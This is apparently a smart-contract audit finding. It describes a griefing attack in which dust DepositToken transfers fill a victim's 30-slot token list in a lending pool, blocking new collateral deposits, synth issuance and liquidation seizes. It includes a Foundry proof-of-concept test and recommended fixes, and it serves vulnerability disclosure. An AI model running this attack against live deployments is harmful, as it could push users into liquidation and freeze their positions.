### Title
Dust `DepositToken` transfers fill a victim's per-account token list to `MAX_TOKENS_PER_USER`, blocking new collateral/debt positions and collateral top-ups - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`Pool` tracks each account's deposit and debt tokens in `depositTokensOfAccount` / `debtTokensOfAccount` (`MappedEnumerableSet`), capped at `MAX_TOKENS_PER_USER = 30`. Entries are added whenever a balance goes `0 -> >0`, including on ordinary ERC20 `transfer`/`transferFrom` of `DepositToken`s, which any holder can push to any recipient. An unprivileged attacker can spam-transfer dust amounts of many distinct `DepositToken`s to a victim, permanently occupying the list slots until the victim fully empties positions — mirroring the reported class where an array/registry change invalidates positions that were created after the check was made.

### Finding Description
- `Pool.addToDepositTokensOfAccount` / `addToDebtTokensOfAccount` revert with `UserReachedMaxTokens` once `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30` [1](#0-0) .
- `DepositToken._transfer` calls `pool.addToDepositTokensOfAccount(recipient_)` whenever the recipient's prior balance was `0`, so a dust `transfer(victim, 1)` of an attacker-held msdTOKEN inserts an entry in the victim's list without consent [2](#0-1) .
- The attacker seeds balances by calling `deposit(amount, attacker)` (permissionless, `onBehalfOf_` arbitrary) across the pool's deposit tokens, then transfers 1 wei of each to the victim [3](#0-2) .
- Once the victim's list is full, every path that adds a new token reverts: `deposit()` into any collateral the victim doesn't already hold (`_mint` → `addToDepositTokensOfAccount`), issuing a new synth (`DebtToken` mint → `addToDebtTokensOfAccount`), and even receiving a new `DepositToken` via `transfer` or liquidation `seize` [4](#0-3) .
- The same griefing extends to `liquidate`: `depositToken_.seize(account_, liquidator, _toLiquidator)` routes through `_transfer`, so a liquidation whose proceeds would create a new token entry for the liquidator reverts if that recipient list is full [5](#0-4) .
- Attack cost is minimal and recoverable: dust deposits sit in `Treasury` and can be withdrawn back after griefing via `withdraw`/`transfer` of the attacker's own msdTOKEN balances.

### Impact Explanation
A victim with an open debt position can be prevented from depositing any collateral type they don't already hold. If their existing collateral's price drops, they cannot add a different asset to restore health and are forced toward liquidation — a direct, attacker-caused loss. Victims also cannot open any new position type, and third-party transfers/seizures into a saturated account revert, causing temporary freezing of receipt and denial of liquidation flows. The attack is cheap, repeatable, and requires no privilege.

### Likelihood Explanation
Requires only an EOA: call `deposit` on each pool `DepositToken` (governor allows up to `MAX_TOKENS_PER_USER` deposit tokens [6](#0-5) ), then dust-`transfer` to the target. No oracle manipulation, flash loan, or trusted role is needed; `deposit`/`transfer` are unpaused public entry points and `addToDepositTokensOfAccount` has no opt-out. Likelihood is moderate since impact requires the victim to need a new collateral type (e.g., during a health crisis).

### Recommendation
- Add an opt-in/approval mechanism so entries are only added to `depositTokensOfAccount` on `deposit()` (user-initiated), not on inbound `transfer`/`seize`, or let recipients remove a dust token with a single `withdraw`-free "dropToken" path that sweeps the residual balance.
- Alternatively, exempt the recipient-add path from the cap when the added balance is below a dust threshold, or raise/uncap `MAX_TOKENS_PER_USER` while bounding the oracle loop `depositOf`/`debtOf` with pagination.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Foundry-style PoC. Assume pool has deposit tokens d[0..n) and debt tokens,
// all active and unpaused. Attacker is a plain EOA holding some underlying.

function test_dustFillVictimTokenList() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Victim already holds deposit token A (slot count = 1)
    deal(address(underlyingA), victim, 100e18);
    vm.startPrank(victim);
    underlyingA.approve(address(depositTokenA), type(uint256).max);
    depositTokenA.deposit(100e18, victim); // depositTokensOfAccount[victim] = {A}
    vm.stopPrank();

    // Attacker deposits dust into every other deposit token and sends 1 wei to victim
    for (uint256 i; i < depositTokens.length; ++i) {
        IDepositToken dt = depositTokens[i];
        if (dt == depositTokenA) continue;
        IERC20 u = dt.underlying();
        deal(address(u), attacker, 2);
        vm.startPrank(attacker);
        u.approve(address(dt), 2);
        dt.deposit(1, attacker);          // mint 1 wei msdTOKEN to attacker
        dt.transfer(victim, 1);           // inserts dt into victim's list
        vm.stopPrank();
    }

    // Victim's combined token count hits MAX_TOKENS_PER_USER
    assertGe(
        pool.getDepositTokensOfAccount(victim).length + pool.getDebtTokensOfAccount(victim).length,
        pool.MAX_TOKENS_PER_USER()
    );

    // 1) Victim cannot deposit any new collateral type
    deal(address(underlyingNew), victim, 1e18);
    vm.startPrank(victim);
    underlyingNew.approve(address(depositTokenNew), 1e18);
    vm.expectRevert(Pool.UserReachedMaxTokens.selector);
    depositTokenNew.deposit(1e18, victim);  // _mint -> addToDepositTokensOfAccount reverts

    // 2) Victim cannot issue a new synthetic asset
    vm.expectRevert(Pool.UserReachedMaxTokens.selector);
    debtTokenSynth.issue(1, victim);        // _mint -> addToDebtTokensOfAccount reverts

    // 3) Inbound transfer/seize of a token the victim doesn't hold reverts
    vm.stopPrank();
    vm.prank(attacker);
    vm.expectRevert(Pool.UserReachedMaxTokens.selector);
    depositTokenOther.transfer(victim, 1);

    // Cleanup path: victim must fully withdraw/transfer out one token before
    // regaining the ability to open a new position. Attacker's dust deposits
    // remain withdrawable, so the griefing is nearly free.
}
```

Key trace: `depositTokenX.transfer(victim, 1)` → `DepositToken._transfer` → `recipient` balance `0 → 1` → `pool.addToDepositTokensOfAccount(victim)` → `onlyIfAdditionWillNotReachMaxTokens` counts toward the `30` cap [7](#0-6) [8](#0-7) .

Caveat: I verified the add/remove hooks in `Pool`/`DepositToken` but did not enumerate every live deployment's registered deposit-token count; if a deployed pool has few deposit tokens, filling 30 combined slots may also require the attacker to first take on debt positions, which is still unprivileged but costs more capital.

        if (sender_ == address(0)) revert TransferFromTheZeroAddress();
        if (recipient_ == address(0)) revert TransferToTheZeroAddress();

        uint256 _senderBalanceBefore = balanceOf[sender_];
        if (_senderBalanceBefore < amount_) revert TransferAmountExceedsBalance();
        uint256 _recipientBalanceBefore = balanceOf[recipient_];

        unchecked {
            balanceOf[sender_] = _senderBalanceBefore - amount_;
            balanceOf[recipient_] += amount_;
        }

        emit Transfer(sender_, recipient_, amount_);

        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
    }
